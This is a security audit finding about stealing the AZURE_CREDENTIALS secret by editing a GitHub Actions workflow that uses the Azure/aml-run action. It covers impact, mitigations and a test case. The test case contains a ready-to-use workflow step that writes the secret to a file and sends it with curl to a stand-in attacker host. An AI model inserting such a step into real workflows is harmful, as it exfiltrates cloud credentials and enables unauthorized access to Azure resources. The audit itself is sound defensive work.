#### 1. Secret Exfiltration through Workflow Modification

- **Description:**
  An attacker with write access to the GitHub repository can modify the workflow YAML file to exfiltrate the `AZURE_CREDENTIALS` secret.
  This can be achieved by adding a malicious step within the workflow definition, before or after the legitimate action steps.
  This malicious step can access the `secrets.AZURE_CREDENTIALS` environment variable and exfiltrate it.
  For example, the attacker could add a step that logs the secret to the workflow output, or sends it to an external service under their control.
  This allows the attacker to bypass the intended security of storing secrets in GitHub Actions, as workflow modifications are not directly monitored for malicious secret access.

- **Impact:**
  Successful exfiltration of the `AZURE_CREDENTIALS` secret grants the attacker unauthorized access to the victim's Azure Machine Learning workspace.
  This access allows the attacker to perform various malicious activities, including:
    - Accessing and stealing sensitive data stored in the workspace.
    - Modifying or deleting machine learning models and experiments.
    - Deploying malicious models.
    - Launching compute resources, potentially incurring significant costs on the victim's Azure subscription.
    - Pivoting to other Azure services accessible with the compromised credentials, depending on the permissions granted to the service principal.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  None. The project itself does not implement any mitigations against workflow modification or secret exfiltration. The security relies solely on GitHub's secret management and repository access controls, which are bypassed by this vulnerability when write access is compromised.

- **Missing Mitigations:**
    - **Principle of Least Privilege for Service Principal:**  While not a mitigation in the action's code, it's a crucial security practice. The documentation should strongly recommend users to create service principals with the minimum necessary permissions required for the action to function, limiting the potential damage if credentials are compromised.
    - **Workflow Protection Mechanisms:** Implement branch protection rules to restrict who can modify the workflow files in the main branch. Require code reviews for workflow changes to add a layer of scrutiny. While these are GitHub repository settings and not part of the action, they are vital for reducing the likelihood of unauthorized workflow modifications.
    - **Strong Security Warnings in Documentation:** The documentation should explicitly warn users about the risks of storing highly sensitive credentials like `AZURE_CREDENTIALS` in GitHub Secrets and the potential for secret exfiltration if repository write access is compromised. It should emphasize the importance of securing repository access and monitoring workflow changes.
    - **Consider Alternative Authentication Methods (If Applicable):** Explore if there are more secure authentication methods that could be used in specific scenarios, although Service Principals are generally the standard approach for automation in Azure.  However, for very high-security contexts, investigating managed identities or workload identity federation for GitHub Actions might be considered for future enhancements, although these are more complex to implement and configure for users.

- **Preconditions:**
    - The attacker must have write access to the GitHub repository where the workflow using this action is defined.
    - The repository must be configured to use the `Azure/aml-run` action and store the `AZURE_CREDENTIALS` secret in GitHub Secrets.

- **Source Code Analysis:**
    - **`action.yml`**: Defines the action's inputs, including `azure_credentials`, which is a required input intended to be passed as a GitHub secret (`${{ secrets.AZURE_CREDENTIALS }}`). The action itself is designed to use this secret for authentication with Azure Machine Learning.
    - **`Dockerfile`, `entrypoint.sh`, `main.py`**: These files constitute the action's execution logic. `main.py` retrieves the `azure_credentials` from environment variables (`os.environ.get("INPUT_AZURE_CREDENTIALS")`) and uses it to authenticate with Azure.
    - **Vulnerability Location**: The vulnerability is not within the action's code itself. It stems from the inherent nature of GitHub Actions and secrets management combined with the potential for workflow modification. An attacker who can modify the workflow YAML can insert arbitrary steps to access and exfiltrate any secrets defined in the workflow, including `AZURE_CREDENTIALS`, *before* the `Azure/aml-run` action's intended code is executed. The action code correctly uses the provided credentials, but it does not and cannot prevent malicious workflow modifications that precede its execution.
    - **Attack Vector Visualization:**
      ```
      Attacker Write Access --> Modify GitHub Workflow YAML (.github/workflows/...)
                                  |
                                  V
      Malicious Workflow Step Added (e.g., Exfiltrate Secret) --> Access ${{ secrets.AZURE_CREDENTIALS }}
                                  |
                                  V
      Secret Exfiltration (e.g., Send to Attacker Server, Log to Output)
                                  |
                                  V
      Unauthorized Access to Azure Machine Learning Workspace
      ```

- **Security Test Case:**
    1. **Prerequisites:**
        - You need a GitHub repository where you have write access.  Ideally, fork the repository containing this GitHub Action for testing purposes.
        - Ensure the repository is set up to use the `Azure/aml-run` action in a workflow and that you have configured the `AZURE_CREDENTIALS` secret.
        - Have a simple HTTP server running (e.g., using `netcat` or `python -m http.server`) or a service like webhook.site to capture exfiltrated data.  Let's assume you are using `https://attacker-controlled-server.com/exfiltrate` as the capture endpoint.
    2. **Modify Workflow:**
        - Navigate to your repository's workflow files (usually under `.github/workflows/`).
        - Edit the workflow YAML file that uses the `Azure/aml-run` action.
        - Insert a new step *before* the step that uses `Azure/aml-run@v1`. This malicious step will exfiltrate the `AZURE_CREDENTIALS` secret. Add the following step to your workflow YAML:

          ```yaml
          - name: Malicious Secret Exfiltration
            run: |
              echo "Attempting to exfiltrate AZURE_CREDENTIALS..."
              SECRET_VALUE="${{ secrets.AZURE_CREDENTIALS }}"
              echo "AZURE_CREDENTIALS=$SECRET_VALUE" > secret.txt
              curl -X POST -H "Content-Type: multipart/form-data" -F "file=@secret.txt" https://attacker-controlled-server.com/exfiltrate
              echo "Exfiltration attempt complete."
          ```
          **Important Security Note:** Replace `https://attacker-controlled-server.com/exfiltrate` with the URL of your actual test server or webhook capture service. **Do not use a real attacker's server!**

    3. **Commit and Push Changes:**
        - Commit the modified workflow file and push the changes to your repository.
    4. **Trigger Workflow Run:**
        - Trigger the workflow run. This can be done by pushing a new commit, creating a pull request, or manually triggering it from the GitHub Actions tab, depending on your workflow's `on` trigger.
    5. **Examine Workflow Logs:**
        - Go to the Actions tab in your repository and find the workflow run you just triggered.
        - Inspect the logs for the "Malicious Secret Exfiltration" step. You should see output indicating that the script attempted to access and potentially exfiltrate the `AZURE_CREDENTIALS` secret.
    6. **Verify Secret Capture (Attacker Server):**
        - Check your attacker-controlled server or webhook capture service logs. You should find a request containing the `secret.txt` file.
        - Examine the contents of `secret.txt`. It should contain the `AZURE_CREDENTIALS` JSON, successfully exfiltrated from the GitHub Actions environment.

    7. **Cleanup:**
        - After testing, **immediately remove the malicious step** from your workflow and commit/push the corrected workflow.
        - **Rotate the `AZURE_CREDENTIALS` secret** in Azure to invalidate the potentially compromised credentials. This is a crucial step to prevent any ongoing unauthorized access if the secret was indeed captured.

This test case demonstrates how an attacker with write access can modify the workflow to steal the `AZURE_CREDENTIALS` secret, confirming the vulnerability.
